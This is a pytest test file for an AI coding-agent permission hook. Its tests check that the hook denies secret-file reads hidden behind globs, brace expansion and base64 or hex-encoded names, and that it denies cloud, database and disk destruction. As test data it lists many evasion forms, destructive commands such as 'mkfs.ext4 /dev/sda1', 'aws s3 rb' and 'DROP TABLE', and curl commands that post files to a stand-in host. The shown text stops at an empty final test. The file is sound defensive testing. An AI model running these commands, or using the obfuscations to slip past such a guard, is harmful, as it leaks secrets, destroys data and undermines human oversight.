"""0.2.2: hidden secret names, destruction outside the project, clearer stops, a faster hook."""
from __future__ import annotations

import io
import json
import os
import subprocess
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from jangseung.cli.hook_run import render_hook_response, run_aeg_hook_run, run_hook_cli
from jangseung.cli.main import main as cli_main
from jangseung.evidence.shell_command_risk import brace_expansions, secret_references
from jangseung.evidence.shell_glob_targets import expand_glob_word
from jangseung.state.evidence_query import summarize_hook_evidence


@pytest.fixture
def project(tmp_path):
    for name, text in {
        "README.md": "public\n", "notes.txt": "ordinary\n", "src/app.py": "print(1)\n", "src/config.py": "X = 1\n",
        ".env": "DUMMY_ONLY=x\n", ".env.example": "DUMMY_ONLY=\n", "certs/server.pem": "dummy\n",
        "certs/readme.txt": "public\n",
    }.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    (tmp_path / ".aeg").mkdir()
    (tmp_path / ".git").mkdir()
    return tmp_path


def payload(root, command, *, mode="default", tool="Bash", session="gaps-test"):
    return json.dumps({
        "tool_name": tool, "tool_input": {"command": command}, "tool_use_id": "t", "session_id": session,
        "cwd": str(root), "hook_event_name": "PreToolUse", "permission_mode": mode,
    })


def result(root, command, **kwargs):
    substrate = kwargs.pop("substrate", "claude-code")
    return render_hook_response(payload(root, command, **kwargs), repo_root=root, substrate=substrate)


def decision(root, command, **kwargs):
    return result(root, command, **kwargs).permission_decision


# --- a secret file reached without spelling its name

@pytest.mark.parametrize("command", [
    "cat .en?", "cat .[e]nv", "cat .[^x]nv", "cat .env*", "cat ./.e*", "cat src/../.en*", "cat .e*",
    "cat certs/*", "cat certs/*.pem", "cat c*/server.p?m", "head -1 .EN*", "shopt -s dotglob; cat c*/*",
    "cat .e[!N]v", "cat .[[:alpha:]]nv", "cat .e[[=n=]]v", "shopt -s globstar; cat **/server.p?m", "cat **/*.pem",
    "f=.en?; cat $f", "f=.en?; cat ${f}", "cat $PWD/.en?", "cat ${PWD}/.en?", "cat ~+/.en?",
    "sudo cat .en?", "timeout 5 head -1 .en?", "bash -c 'cat .en?'", "for f in .en?; do cat $f; done",
    "git diff --no-index /dev/null .en?", "rm .en?", "cp .en? /tmp/x", "find . -name '.e*' -exec cat {} +",
    "cat a* b* c* d* e* f* g* h* i* j* k* l* m* n* o* p* .en?",
    "cat .en{v,x}", "cat .{env,x}", "cat {README.md,.env}", "cat {a,{b,.env}}", "cat .e{n,m}{v,w}", "cat {.e,x}n?",
    "cat $(echo LmVudg== | base64 -d)", "cat $(echo LmVudg | base64 -d)", "cat $(echo 2e656e76 | xxd -r -p)",
    "python -c \"import base64;print(open(base64.b64decode('LmVudg==').decode()).read())\"",
    "python -c \"print(open(bytes.fromhex('2e656e76').decode()).read())\"",
    "node -e \"require('fs').readFileSync(atob('LmVudg=='))\"",
])
def test_a_hidden_secret_name_is_denied(project, command):
    answer = result(project, command)
    assert answer.permission_decision == "deny"
    assert "shell_command_references_secret_path" in answer.reason_codes
    assert decision(project, command, substrate="codex") == "deny"


@pytest.mark.parametrize("command", [
    "Get-Content .en*", "gc .\\.e?v", "Get-Content c*\\*", "type certs\\*.pem", "Get-Content c*\\server.pem",
    "Get-Content -Path:.en?", "gc $PWD\\.en?", "Get-Content -Path .en?",
])
def test_a_powershell_wildcard_reaching_a_secret_is_denied(project, command):
    assert decision(project, command, tool="PowerShell") == "deny"


@pytest.mark.parametrize("command", [
    "cat *", "wc -l *.py", "ls *.md", "ls src/*.py", "head -5 */*.py", "cat src/{app,config}.py",
    "cat certs/*.txt", "cat nothing*", "cat /etc/pass*", "echo {a,b}", "cat {1..3}",
])
def test_a_wildcard_that_reaches_no_secret_is_not_denied(project, command):
    assert decision(project, command) != "deny"


def test_a_wildcard_is_matched_against_the_files_that_exist(project):
    assert decision(project, "cat src/*") != "deny"
    (project / "src" / "id_rsa").write_text("dummy\n", encoding="utf-8")
    assert decision(project, "cat src/*") == "deny"
    assert decision(project, "wc -l src/*.py") != "deny"


@pytest.mark.parametrize("command,tool", [
    ("cd certs && cat s*", "Bash"), ("cd src && cat ../.e*", "Bash"), ("pushd certs; cat *.p?m", "Bash"),
    ("cd ./certs && head -1 s*", "Bash"), ("Set-Location certs; Get-Content s*", "PowerShell"),
    ("Set-Location -Path certs; Get-Content *.pem", "PowerShell"), ("cd certs; gc s*", "PowerShell"),
])
def test_a_wildcard_is_also_tried_in_the_folder_the_command_enters(project, command, tool):
    assert decision(project, command, tool=tool) == "deny"


@pytest.mark.parametrize("command", ["cd src && ls *.py", "cd src && wc -l *", "cd missing && cat *"])
def test_a_wildcard_after_cd_that_reaches_no_secret_is_not_denied(project, command):
    assert decision(project, command) != "deny"


def test_a_path_opened_by_policy_is_not_caught_by_a_wildcard(project):
    (project / ".aeg/policy.json").write_text(json.dumps({"allow_paths": ["certs/server.pem"]}), encoding="utf-8")
    assert decision(project, "cat certs/*") != "deny"
    assert decision(project, "cat .en*") == "deny"


@pytest.mark.parametrize("command", [
    "echo aWRfcnNh", "echo LmVudg==", "git log --format=%H deadbeef", "git show 2e656e76", "echo main", "git checkout -b feature",
])
def test_ordinary_words_and_read_commands_keep_their_judgment(project, command):
    assert decision(project, command) in {"allow", "host"}


def test_encoded_names_are_decoded_only_as_whole_words():
    assert secret_references(["LmVudg=="]) == ("LmVudg==",)
    assert secret_references(["LmVudg"]) == ("LmVudg",)
    assert secret_references(["2e656e76"]) == ("2e656e76",)
    assert secret_references(["aWRfcnNh"]) == ("aWRfcnNh",)  # id_rsa
    assert secret_references(["main", "feature", "deadbeef", "0123456789abcdef", "README", "aGVsbG8="]) == ()


def test_brace_expansion_is_bounded_and_leaves_plain_words_alone():
    assert set(brace_expansions(".en{v,x}")) == {".env", ".enx"}
    assert set(brace_expansions("{a,{b,.env}}")) == {"a", "b", ".env"}
    assert brace_expansions("plain") == () and brace_expansions("{a}") == () and brace_expansions("{1..3}") == ()
    assert len(brace_expansions("{a,b}" * 10)) <= 64


def test_glob_expansion_follows_shell_rules(project):
    from jangseung.evidence.shell_glob_targets import GlobBudget

    def expand(word, **kwargs):
        options = {"windows_style": False, "include_hidden": False, "budget": GlobBudget(project), **kwargs}
        return set(expand_glob_word(word, project, **options))

    assert expand("*") >= {"README.md", "notes.txt", "src", "certs"} and ".env" not in expand("*")
    assert ".env" in expand("*", include_hidden=True) and ".env" in expand(".e*")
    assert expand("certs\\*.pem", windows_style=True) == {"certs/server.pem"}
    assert expand("missing/*") == set() and expand("~other/*") == set() and expand("$UNKNOWN/*") == set()
    assert expand("s3:*") == set() and expand("x" * 600 + "*") == set() and expand("a\x00b/*") == set()
    assert expand("**/*.pem") == {"certs/server.pem"} and expand("*/../.e?v") == {".env"}
    assert expand(".e[!N]v") == {".env"} and expand(".[[:alpha:]]nv") == {".env"} and expand(".e[^x]v") == {".env"}
    absolute = {Path(item) for item in expand(str(project).replace("\\", "/") + "/cert?/*.pem")}
    assert absolute == {project / "certs" / "server.pem"}


# --- destruction that lands outside the project

@pytest.mark.parametrize("command,kind", [
    ("aws s3 rb s3://bucket --force", "remote_destroy"), ("aws s3 rm s3://bucket --recursive", "remote_destroy"),
    ("aws s3 sync . s3://bucket --delete", "remote_destroy"), ("aws ec2 terminate-instances --instance-ids i-1", "remote_destroy"),
    ("aws cloudformation delete-stack --stack-name x", "remote_destroy"), ("gcloud projects delete p", "remote_destroy"),
    ("gcloud compute instances delete vm", "remote_destroy"), ("az group delete -n rg --yes", "remote_destroy"),
    ("firebase firestore:delete --all-collections", "remote_destroy"), ("vercel rm app", "remote_destroy"),
    ("fly apps destroy app", "remote_destroy"), ("heroku apps:destroy app", "remote_destroy"),
    ("bash -c \"aws s3 rb s3://b\"", "remote_destroy"),
    ("psql -c 'DROP TABLE users'", "database_destroy"), ("psql -c \"delete from users\"", "database_destroy"),
    ("psql -c 'truncate users'", "database_destroy"), ("mysql -e 'DROP DATABASE app'", "database_destroy"),
    ("redis-cli FLUSHALL", "database_destroy"), ("timeout 5 redis-cli flushdb", "database_destroy"),
    ("mongosh --eval 'db.dropDatabase()'", "database_destroy"), ("mongosh --eval 'db.users.drop()'", "database_destroy"),
    ("PGPASSWORD=x psql -c 'drop schema public cascade'", "database_destroy"), ("dropdb app", "database_destroy"),
    ("mysqladmin drop app", "database_destroy"),
    ("mkfs.ext4 /dev/sda1", "system_destroy"), ("mkfs /dev/sda1", "system_destroy"), ("wipefs -a /dev/sda", "system_destroy"),
    ("shutdown -h now", "system_destroy"), ("reboot", "system_destroy"), ("kill -9 -1", "system_destroy"),
    ("kill -- -1", "system_destroy"), ("kill 1", "system_destroy"), ("kill -s KILL -1", "system_destroy"),
])
def test_destruction_outside_the_project_is_denied_and_named(project, command, kind):
    answer = result(project, command)
    assert answer.permission_decision == "deny"
    assert f"dangerous_command_kind:{kind}" in answer.reason_codes
    assert decision(project, command, substrate="codex") == "deny"


@pytest.mark.parametrize("command,kind", [
    ("aws s3 rb s3://bucket --force", "remote_destroy"), ("psql -c \"DROP TABLE users\"", "database_destroy"),
    ("Stop-Computer -Force", "system_destroy"), ("Restart-Computer", "system_destroy"),
    ("Format-Volume -DriveLetter D", "system_destroy"),
])
def test_powershell_destruction_is_denied_and_named(project, command, kind):
    answer = result(project, command, tool="PowerShell")
    assert answer.permission_decision == "deny"
    assert f"dangerous_command_kind:{kind}" in answer.reason_codes


@pytest.mark.parametrize("command", [
    "aws s3 ls", "aws s3 cp a.txt s3://b/a.txt", "aws ec2 describe-instances", "aws sts get-caller-identity",
    "gcloud projects list", "az group list", "vercel ls", "psql -c \"select * from users\"", "psql -f migrate.sql",
    "psql -c \"delete from users where id = 1\"", "mysql -e \"show tables\"", "redis-cli get key",
    "mongosh --eval 'db.users.find()'", "sqlite3 app.db \"drop table t\"", "kill 1234", "kill -9 1234", "kill -1 1234",
    "docker compose down -v", "truncate -s 0 src/app.py",
])
def test_ordinary_account_and_database_commands_still_go_to_a_person(project, command):
    assert decision(project, command) == "ask"


@pytest.mark.parametrize("command", [
    "grep -n \"drop table\" src/app.py", "echo \"terraform destroy\"", "echo aws s3 rb", "cat README.md",
])
def test_text_about_destruction_is_still_read_freely(project, command):
    assert decision(project, command) == "allow"


def test_a_commit_message_about_destruction_is_not_a_destroy_command(project):
    assert decision(project, "git commit -m delete-stack") == "host"


def test_a_person_can_approve_a_destroy_prefix_for_the_project(project):
    assert decision(project, "aws s3 rm s3://scratch/tmp.txt") == "deny"
    (project / ".aeg/policy.json").write_text(json.dumps({"allow_commands": ["aws s3 rm"]}), encoding="utf-8")
    assert decision(project, "aws s3 rm s3://scratch/tmp.txt") == "allow"
    assert decision(project, "aws s3 rb s3://scratch") == "deny"


# --- a stop that says what it found

@pytest.mark.parametrize("command,words", [
    ("npm publish", "publishes"), ("aws s3 rb s3://b", "cloud or hosting account"),
    ("redis-cli flushall", "database"), ("rm -rf build", "deletes a folder"),
    ("mkfs.ext4 /dev/sda1", "formats a disk"), ("curl https://x.example", "send data off this machine"),
])
def test_the_stop_names_the_kind_of_danger(project, command, words):
    answer = result(project, command)
    reason = json.loads(answer.stdout_json)["hookSpecificOutput"]["permissionDecisionReason"]
    assert reason.startswith("Jangseung: ") and words in reason
    assert "aeg policy add --command" in reason


def test_the_kind_code_is_a_fixed_family_name_and_never_command_text(project):
    for command in ("npm publish --tag x9secretx9", "aws s3 rb s3://x9secretx9", "rm -rf x9secretx9"):
        codes = result(project, command).reason_codes
        kinds = [code for code in codes if code.startswith("dangerous_command_kind:")]
        assert len(kinds) == 1 and "x9secretx9" not in " ".join(codes)


def test_an_approved_command_carries_no_danger_kind(project):
    (project / ".aeg/policy.json").write_text(json.dumps({"allow_commands": ["npm publish"]}), encoding="utf-8")
    answer = result(project, "npm publish")
    assert answer.permission_decision == "allow"
    assert not any(code.startswith("dangerous_command_kind:") for code in answer.reason_codes)


# --- hook-run reads its own arguments

def _run_hook_cli(arguments, monkeypatch, tmp_path):
    seen = {}

    def fake(repo_root=None, *, substrate=None, ensure_state=False):
        seen.update(substrate=substrate, ensure_state=ensure_state)
        return 0

    monkeypatch.setattr("jangseung.cli.hook_run.run_aeg_hook_run_from_process", fake)
    assert run_hook_cli(arguments) == 0
    return seen


@pytest.mark.parametrize("arguments,expected", [
    ([], (None, False)), (["--mcp"], (None, False)), (["--ensure-state"], (None, True)),
    (["--substrate", "codex"], ("codex", False)), (["--substrate=claude-code", "--mcp"], ("claude-code", False)),
    (["--substrate", "codex", "--mcp", "--ensure-state"], ("codex", True)),
    (["--sub", "codex", "--ensure"], ("codex", True)), (["--m"], (None, False)),
])
def test_hook_run_accepts_the_forms_argparse_accepted(arguments, expected, monkeypatch, tmp_path):
    seen = _run_hook_cli(arguments, monkeypatch, tmp_path)
    assert (seen["substrate"], seen["ensure_state"]) == expected


@pytest.mark.parametrize("arguments", [
    ["--bogus"], ["extra"], ["--substrate"], ["--substrate", "other"], ["--substrate="], ["--mcp=1"],
    ["--ensure-state=yes"], ["--"], ["-s", "codex"], ["--help"],
])
def test_hook_run_blocks_on_arguments_it_does_not_know(arguments, monkeypatch, capsys):
    monkeypatch.setattr("jangseung.cli.hook_run.run_aeg_hook_run_from_process", lambda *a, **k: 0)
    with pytest.raises(SystemExit) as stopped:
        run_hook_cli(arguments)
    assert stopped.value.code == 2
    assert "usage: aeg hook-run" in capsys.readouterr().err


def test_the_hook_path_does_not_load_modules_it_never_uses():
    code = (
        "import sys\n"
        "before = set(sys.modules)\n"
        "import jangseung.cli.hook_run\n"
        "print(sorted({'argparse', 'tempfile', 'shutil'} & (set(sys.modules) - before)))\n"
    )
    root = Path(__file__).resolve().parents[1]
    env = dict(os.environ, PYTHONPATH=str(root))
    done = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, env=env, cwd=root, check=True)
    assert done.stdout.strip() == "[]"


# --- aeg evidence summary

def _record(project, command, *, mode="plan", session="summary"):
    run_aeg_hook_run(stdin=io.StringIO(payload(project, command, mode=mode, session=session)), stdout=io.StringIO(),
                     stderr=io.StringIO(), repo_root=project, working_dir=project)


def test_summary_counts_decisions_and_names_what_was_stopped(project):
    for command in ("pytest", "pytest -q", "docker build .", "curl https://x.example", "cat .env", "git status"):
        _record(project, command)
    _record(project, "pytest", mode="default")
    summary = summarize_hook_evidence(project)
    assert summary["records"] == 7 and summary["unreadable"] == 0
    assert summary["decisions"] == {"allow": 1, "host": 1, "ask": 3, "deny": 2}
    rows = {(row["decision"], row["what"]): (row["count"], row["category"]) for row in summary["stopped"]}
    assert rows[("ask", "pytest")] == (2, "unclassified")
    assert rows[("ask", "docker")] == (1, "unclassified")
    assert rows[("deny", "curl")] == (1, "dangerous_command")
    assert rows[("deny", "cat")] == (1, "secret_or_outside_read")
    assert summary["stopped"][0]["what"] == "pytest"


def test_summary_never_shows_a_command_line(project):
    _record(project, "pytest tests/test_x9marker.py -k x9marker")
    text = json.dumps(summarize_hook_evidence(project))
    assert "x9marker" not in text and "pytest" in text


def test_summary_can_be_limited_to_recent_days(project):
    _record(project, "pytest")
    later = datetime.now(timezone.utc) + timedelta(days=10)
    assert summarize_hook_evidence(project, days=7)["records"] == 1
    assert summarize_hook_evidence(project, days=7, now=later)["records"] == 0
    assert summarize_hook_evidence(project, now=later)["records"] == 1


def test_summary_reads_and_never_writes(project):
    _record(project, "pytest")
    ledger = project / ".aeg" / "hook_ledger.jsonl"
    before = (ledger.read_bytes(), sorted(path.name for path in (project / ".aeg").iterdir()))
    summarize_hook_evidence(project)
    assert before == (ledger.read_bytes(), sorted(path.name for path in (project / ".aeg").iterdir()))


def test_summary_command_prints_a_table_and_hints(project, monkeypatch, capsys):
    for command in ("pytest", "curl https://x.example"):
        _record(project, command)
    monkeypatch.chdir(project)
    monkeypatch.setattr("jangseung.state.git.repo_root", lambda cwd: project)
    assert cli_main(["evidence", "summary"]) == 0
    out = capsys.readouterr().out
    assert "decisions: allow 0, host 0, ask 1, deny 1" in out
    assert "pytest" in out and "curl" in out and "aeg policy add --command" in out
    assert cli_main(["evidence", "summary", "--days", "1", "--json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data["status"] == "OK" and data["days"] == 1 and data["records"] == 2


def test_summary_of_an_empty_project_says_so(project, monkeypatch, capsys):
    monkeypatch.chdir(project)
    monkeypatch.setattr("jangseung.state.git.repo_root", lambda cwd: project)
    assert cli_main(["evidence", "summary"]) == 0
    assert "No persisted hook records found." in capsys.readouterr().out


# --- findings of the independent review of the first draft

def test_a_bare_wildcard_is_left_with_the_person_asked(project):
    """``*`` is also arithmetic, a regular expression and "every property"."""

    (project / "server.pem").write_text("dummy\n", encoding="utf-8")
    for command in ("echo $((a * b))", "expr 2 '*' 3", "git commit -m '*'", "ls *", "ls -d .*", "cat *", "cat .*",
                    "python -c \"print(2 * 3)\"", "find . -name '.*'", "grep -rn '.*' src/", "[[ $f =~ .* ]]",
                    "shopt -s dotglob; cat *", "cd certs && cat *"):
        assert decision(project, command) != "deny", command
    for command in ("$a = 2 * 3", "Select-Object *", "Get-Process *", "dir *", "Write-Host '*'", "Get-Content *"):
        assert decision(project, command, tool="PowerShell") != "deny", command
    assert decision(project, "git add *") == "ask"


OUTSIDE_PROJECT_COMMANDS = [
    ("Bash", "cat ~/.ss?/id_*"), ("Bash", "cat $HOME/.ss?/id_*"), ("Bash", "cat ../*"), ("Bash", "cat ../../*/x*"),
    ("Bash", "cat /etc/pass*"), ("Bash", "cat /c/Windows/win*"), ("Bash", "cat C:/Windows/win*"),
    ("Bash", "cat //192.0.2.11/s/a*"), ("Bash", "cat '\\\\192.0.2.21\\s'/a*"),
    ("Bash", "cd //192.0.2.11/s; cd //192.0.2.12/s; cat a*"), ("Bash", "cd /; cat e*/pass*"), ("Bash", "cd ..; cat a*"),
    ("Bash", "cd ~; cat .ss?/id_*"), ("PowerShell", "cd \\\\192.0.2.9\\share; gc a*"),
    ("PowerShell", "Get-Content \\\\192.0.2.9\\share\\a*"), ("PowerShell", "gc C:\\Windows\\win*"),
    ("PowerShell", "Set-Location ..; gc a*"), ("PowerShell", "gc $HOME\\.ss?\\id_*"),
]


def test_nothing_outside_the_project_is_ever_listed(project, monkeypatch):
    """A share or another drive in the command must not make the hook open it."""

    import os
    import time

    listed = []
    real_scandir = os.scandir

    def recording_scandir(path="."):
        listed.append(os.path.normcase(os.path.abspath(str(path))))
        return real_scandir(path)

    monkeypatch.setattr("jangseung.evidence.shell_glob_targets.os.scandir", recording_scandir)
    root = os.path.normcase(os.path.abspath(str(project)))
    for tool, command in OUTSIDE_PROJECT_COMMANDS:
        started = time.perf_counter()
        answer = decision(project, command, tool=tool)
        assert time.perf_counter() - started < 2, command
        assert answer in {"ask", "deny"}, command
    assert decision(project, "cat .en?") == "deny"
    assert listed and all(path == root or path.startswith(root + os.sep) for path in listed), listed


def test_the_budget_refuses_folders_outside_the_project(project):
    from jangseung.evidence.shell_glob_targets import GlobBudget

    budget = GlobBudget(project)
    assert budget.allows(project) and budget.allows(project / "certs") and budget.allows(project / "src" / ".." / "certs")
    for outside in (project.parent, project / "..", "//192.0.2.1/share", "\\\\192.0.2.1\\share", "/", "Z:\\x",
                    str(project) + "-sibling", "a\x00b"):
        assert not budget.allows(outside), outside
        assert budget.list_names(Path(str(outside).replace("\x00", ""))) == [] or outside == "a\x00b"
    assert budget.directories == 64  # Refused before anything was listed.


def test_a_home_wildcard_stays_with_the_person_asked(project):
    assert decision(project, "cat ~/.ss?/id_*") == "ask"
    assert decision(project, "cat ~/.ssh/id_rsa") == "deny"  # The name written out is still denied.


@pytest.mark.parametrize("command,tool", [
    ("ls .en?", "Bash"), ("ls certs/s*", "Bash"), ("ls -la c*/s*", "Bash"), ("git status certs/*", "Bash"),
    ("git add certs/s*", "Bash"), ("find . -name '.e*'", "Bash"), ("[ -f .en? ]", "Bash"), ("echo .en?", "Bash"),
    ("stat certs/s*", "Bash"), ("test -e .en?", "Bash"),
    ("tar --exclude=.e* -czf a.tgz src", "Bash"), ("grep -r --exclude=.e* foo src", "Bash"),
    ("zip -r a.zip . --exclude=.e*", "Bash"), ("PATTERN=.e* make test", "Bash"),
    ("docker build --build-arg X=.e* .", "Bash"), ("git show HEAD:certs/s*", "Bash"),
    ("kubectl cp ns/pod:certs/* /tmp/x", "Bash"), ("python -c \"import glob; print(glob.glob('.e*'))\"", "Bash"),
    ("zip -r a.zip . -x '.e*'", "Bash"), ("tar czf a.tgz --exclude '.e*' src", "Bash"),
    ("grep -r --exclude '.e*' foo src", "Bash"), ("grep -rn '.en?' src", "Bash"), ("jq '.e*' package.json", "Bash"),
    ("sed -n '/.e*/p' README.md", "Bash"), ("case $x in .e*) echo y;; esac", "Bash"), ("ls .en? && echo found", "Bash"),
    ("ls .e* | wc -l", "Bash"), ("ls certs/s* | wc -l", "Bash"), ("ls -la certs/s* | grep pem", "Bash"),
    ("find . -name '.e*' | wc -l", "Bash"), ("test -f .en? && npm start", "Bash"),
    ("if [ -f .en? ]; then echo found; fi", "Bash"), ("for f in certs/s*; do echo $f; done", "Bash"),
    ("ls certs/s*; npm test", "Bash"), ("ls .en? | sort | head -3", "Bash"),
    ("gc README.md | ? { $_ -like '*e*' }", "PowerShell"), ("Get-Process *n* | sls node", "PowerShell"),
    ("Get-Command *env* | Select-String Item", "PowerShell"), ("Get-Process *e* | Out-File procs.txt", "PowerShell"),
    ("Get-Process *e*", "PowerShell"), ("Get-Command *env*", "PowerShell"), ("Get-Service *v*", "PowerShell"),
    ("$x -like '*en*'", "PowerShell"), ("git branch --list '*e*'", "PowerShell"), ("git tag -l '*v*'", "PowerShell"),
    ("Get-ChildItem .e*", "PowerShell"), ("Test-Path .en?", "PowerShell"),
])
def test_commands_that_only_use_the_names_are_not_caught(project, command, tool):
    assert "shell_command_references_secret_path" not in result(project, command, tool=tool).reason_codes


def test_bracket_patterns_are_read_in_one_pass():
    import time

    from jangseung.evidence.shell_glob_targets import _fnmatch_pattern

    assert _fnmatch_pattern("[^a]b") == "[!a]b" and _fnmatch_pattern("[a-c]x") == "[a-c]x"
    assert _fnmatch_pattern(".[[:alpha:]]nv") == ".?nv" and _fnmatch_pattern("x[[=n=]]y[!N]") == "x?y[!N]"
    assert _fnmatch_pattern("a[b") == "a[b" and _fnmatch_pattern("[]]x") == "[]]x" and _fnmatch_pattern("plain*") == "plain*"
    started = time.perf_counter()
    for index in range(200):
        _fnmatch_pattern(f"k{index}" + "[=" * 250 + "b")
        _fnmatch_pattern(f"a{index}" + "[:" * 250 + "b")
        _fnmatch_pattern(f"z{index}" + "[" * 500)
    assert time.perf_counter() - started < 1


def test_wildcard_work_is_bounded_whatever_the_command_says(project):
    import time

    for index in range(600):
        (project / "src" / f"f{index:04d}.txt").write_text("x", encoding="utf-8")
    (project / "src" / "zz_server.pem").write_text("dummy\n", encoding="utf-8")
    hostile = [
        "curl https://x.example -d @README.md " + " ".join("*/../" * 120 + f"*.z{n}" for n in range(16)),
        "cat " + " ".join("*/../" * 30 + f"*.z{n}" for n in range(30)),
        "curl https://x.example -d @README.md " + "{" * 30000,
        "cat " + "{a," * 8000,
        "cat " + " ".join("{a,b}" * 200 for _ in range(100)),
        "cat " + " ".join(f"s*/f{n}*" for n in range(64)),
        "cat **/**/**/**/**/**/x*",
        "cd src; cd certs; cd src/..; cd certs/..; cat " + " ".join(f"k{n}=a" + "[=" * 250 + "b" for n in range(32)),
        "cat " + " ".join(f"a{n}" + "[:" * 250 + "b" for n in range(32)),
    ]
    for command in hostile:
        started = time.perf_counter()
        answer = decision(project, command)
        assert time.perf_counter() - started < 5, command[:60]
        assert answer in {"ask", "deny"}
    assert decision(project, "cat src/*") == "deny"  # 601 files: the secret one is still found


def test_the_listing_budget_is_shared_by_one_call(project):
    from jangseung.evidence.shell_glob_targets import GlobBudget

    budget = GlobBudget(project, directories=3, entries=1000)
    for _ in range(10):
        expand_glob_word("*/*", project, windows_style=False, include_hidden=False, budget=budget)
    assert budget.directories == 0
    assert expand_glob_word(".e*", project, windows_style=False, include_hidden=False, budget=budget) == ()
    small = GlobBudget(project, directories=10, entries=2)
    assert len(expand_glob_word("*", project, windows_style=False, include_hidden=True, budget=small)) <= 2


def test_a_nul_in_a_wildcard_word_is_not_an_internal_error(project):
    answer = result(project, "cat a\x00b/*")
    assert answer.permission_decision == "ask"
    assert not any("internal" in code for code in answer.reason_codes)


def test_brace_expansion_cost_is_linear():
    import time

    started = time.perf_counter()
    assert brace_expansions("{" * 60000) == ()
    assert brace_expansions("{a," * 600) == ()
    assert brace_expansions("x" * 5000 + "{a,b}") == ()
    assert time.perf_counter() - started < 2


@pytest.mark.parametrize("command", [
    "aws s3 ls --profile rm", "aws lambda get-function --function-name purge-cache",
    "aws cloudformation describe-stacks --stack-name delete-me", "aws s3 rb --help", "vercel logs delete-api",
    "supabase migration new delete-users", "gcloud compute instances list --filter delete",
    "fdisk -l", "parted -l", "sfdisk --dump /dev/sda", "diskutil list", "bcdedit /enum", "vssadmin list shadows",
    "pg_restore -l dump", "pg_restore -d app dump", "mongorestore dump", "dropdb --help", "shutdown.exe /a",
    "shutdown -c", "kill -l 1", "kill -l", "systemctl status nginx", "systemctl restart nginx", "init 3",
    "mysql -e \"select truncate(price, 2) from items\"", "psql -c \"select 'drop'\"", "format README.md",
    "mkfs --help", "shred notes.txt",
])
def test_reading_and_ordinary_forms_of_those_programs_are_not_denied(project, command):
    assert decision(project, command) == "ask"


@pytest.mark.parametrize("command,kind", [
    ("aws --profile a --region b --output c --color d --endpoint-url e --ca-bundle f s3 rb s3://b", "remote_destroy"),
    ("aws --debug s3 rm s3://b/x", "remote_destroy"), ("aws s3api delete-bucket --bucket b", "remote_destroy"),
    ("gsutil -m rm -r gs://b", "remote_destroy"), ("bq rm -r dataset", "remote_destroy"),
    ("az storage account delete -n x", "remote_destroy"), ("gcloud alpha compute instances delete vm", "remote_destroy"),
    ("netlify sites:delete x", "remote_destroy"),
    ("psql -c'drop table users'", "database_destroy"), ("mysql -e'drop database x'", "database_destroy"),
    ("psql -c 'BEGIN; DELETE FROM users; COMMIT;'", "database_destroy"), ("psql -c 'TRUNCATE TABLE users'", "database_destroy"),
    ("pg_restore --clean -d app dump", "database_destroy"), ("pg_restore -c -d app dump", "database_destroy"),
    ("mongorestore --drop dump", "database_destroy"), ("psql -h db.example -c 'drop table t'", "database_destroy"),
    ("format D:", "system_destroy"), ("systemctl poweroff", "system_destroy"), ("systemctl reboot", "system_destroy"),
    ("init 0", "system_destroy"), ("init 6", "system_destroy"), ("fdisk /dev/sda", "system_destroy"),
    ("parted /dev/sda mklabel gpt", "system_destroy"), ("diskutil eraseDisk JHFS+ x disk2", "system_destroy"),
    ("diskutil apfs deleteContainer disk1", "system_destroy"), ("vssadmin delete shadows /all", "system_destroy"),
    ("bcdedit /delete {current}", "system_destroy"), ("shutdown /s /t 0", "system_destroy"),
])
def test_forms_the_first_draft_missed_are_denied(project, command, kind):
    answer = result(project, command)
    assert answer.permission_decision == "deny"
    assert f"dangerous_command_kind:{kind}" in answer.reason_codes


# --- findings of the second review

@pytest.mark.parametrize("command,kind", [
    ("kill -9 -1 --help", "system_destroy"), ("kill -9 -1 -l", "system_destroy"), ("reboot /?", "system_destroy"),
    ("halt -f /?", "system_destroy"), ("wipefs -a /dev/sda", "system_destroy"), ("wipefs --all /dev/sda /?", "system_destroy"),
    ("shutdown -r -t 0 -c maintenance", "system_destroy"), ("shutdown -h now", "system_destroy"),
    ("parted -s /dev/sda mklabel gpt", "system_destroy"), ("sgdisk -d 1 /dev/sda", "system_destroy"),
    ("sgdisk -p -Z /dev/sda", "system_destroy"), ("sgdisk --zap-all /dev/sda", "system_destroy"),
    ("fdisk /dev/sda", "system_destroy"), ("mkfs.ext4 /dev/sda1", "system_destroy"),
    ("aws ec2 --region us-east-1 terminate-instances --instance-ids i-1", "remote_destroy"),
    ("aws s3 --endpoint-url http://localhost:4566 rb s3://b", "remote_destroy"),
    ("aws cloudformation --region eu-west-1 delete-stack --stack-name s", "remote_destroy"),
    ("gcloud compute --project p instances delete vm", "remote_destroy"),
    ("az group --subscription s delete -n rg", "remote_destroy"), ("az storage blob delete-batch -s c", "remote_destroy"),
    ("doctl compute droplet delete-by-tag x", "remote_destroy"), ("bq --headless rm -f ds.t", "remote_destroy"),
    ("firebase --non-interactive firestore:delete --all-collections", "remote_destroy"),
    ("vercel rm help", "remote_destroy"), ("aws s3 rb s3://b --force --help=x", "remote_destroy"),
    ("psql -c 'select 1; drop table t'", "database_destroy"), ("redis-cli -h cache.example flushall", "database_destroy"),
    ("pg_restore -Fc -c -d app dump", "database_destroy"),
])
def test_destroy_forms_found_by_the_second_review_are_denied(project, command, kind):
    answer = result(project, command)
    assert answer.permission_decision == "deny"
    assert f"dangerous_command_kind:{kind}" in answer.reason_codes


@pytest.mark.parametrize("command", [
    "pg_restore -Fc -l dump", "pg_restore -Fc -d app dump", "pg_restore -hlocalhost -d app dump",
    "fdisk --version", "parted --version", "sfdisk -J /dev/sda", "sfdisk -d /dev/sda", "sgdisk -p /dev/sda",
    "sgdisk -D /dev/sda", "parted /dev/sda print", "parted -s /dev/sda print", "wipefs /dev/sda",
    "mkfs.ext4 -n /dev/sda1", "aws s3 rm help", "aws s3 rb --help", "gcloud projects delete --help",
    "psql -c \"comment on table t is 'do not truncate me'\"", "psql -c \"select 'drop table x'\"",
    "redis-cli keys 'flushall*'", "redis-cli get flushall-count", "kill -l", "kill -l 1", "shutdown -c", "shutdown /a",
    "aws s3 ls --profile rm", "aws ec2 --region delete-me describe-instances", "reboot --help",
])
def test_show_only_forms_found_by_the_second_review_are_not_denied(project, command):
    assert decision(project, command) == "ask"


def test_whatif_makes_a_powershell_disk_command_a_preview(project):
